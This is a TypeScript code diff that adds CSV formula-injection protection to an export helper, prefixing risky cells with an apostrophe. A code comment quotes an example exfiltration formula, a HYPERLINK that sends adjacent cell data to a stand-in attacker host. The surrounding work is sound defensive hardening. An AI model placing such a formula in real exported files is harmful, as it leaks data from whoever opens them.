@@ -32,6 +32,17 @@ export function exportJson(rows: unknown[], filename: string): void {
 // Escape a single CSV cell per RFC 4180 — quote fields that contain the
 // delimiter, a quote, a newline, or start/end whitespace (the last one
 // avoids spreadsheet tools silently trimming). Nested quotes are doubled.
+//
+// #1732 — formula-injection neutralisation. Spreadsheet apps (Excel,
+// LibreOffice Calc, Google Sheets) interpret a cell whose first
+// character is one of `=`, `+`, `-`, `@`, tab (\t), CR (\r), LF (\n)
+// as a formula. An agent-controlled message body starting with
+// `=HYPERLINK("http://attacker/?leak=" & A1, "click")` would exfiltrate
+// adjacent cell content the moment an operator double-clicks the
+// downloaded CSV. OWASP recommends prefixing such cells with a single
+// apostrophe (the spreadsheet "literal text" sigil) before any other
+// quoting; we do that uniformly, then fall through to the standard
+// RFC 4180 quoting so the apostrophe survives the round-trip.
 export function csvEscape(value: unknown): string {
   if (value === null || value === undefined) return "";
   let s: string;
@@ -56,6 +67,12 @@ export function csvEscape(value: unknown): string {
         s = "";
       }
     }
+  }
+  // Formula-injection neutralisation (#1732). Done BEFORE the quoting
+  // decision so an apostrophe-prefixed cell still gets RFC 4180 quoting
+  // when the underlying text contains a comma / quote / newline.
+  if (s.length > 0 && /^[=+\-@\t\r\n]/.test(s)) {
+    s = `'${s}`;
   }
   const needsQuoting =
     s.includes(",") ||
